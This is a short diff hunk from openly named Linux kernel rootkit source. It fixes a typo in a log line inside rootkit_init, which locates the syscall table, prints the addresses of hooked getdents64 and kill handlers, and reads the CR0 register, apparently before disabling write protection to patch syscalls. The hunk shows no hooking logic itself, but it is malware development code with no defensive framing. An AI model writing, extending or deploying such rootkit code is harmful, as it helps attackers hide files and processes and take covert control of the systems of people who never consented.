@@ -307,7 +307,7 @@ static int __init rootkit_init(void)
 	if (!__sys_call_table)
 		return -1;
 	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ sys_call_table address: 0x%px \n", __sys_call_table);
-        printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hack_getends64 address: 0x%px \n", hacked_getends64);
+        printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hack_getends64 address: 0x%px \n", hacked_getdents64);
         printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hack_kill address: 0x%px \n", hacked_kill);
 
 	cr0 = read_cr0();
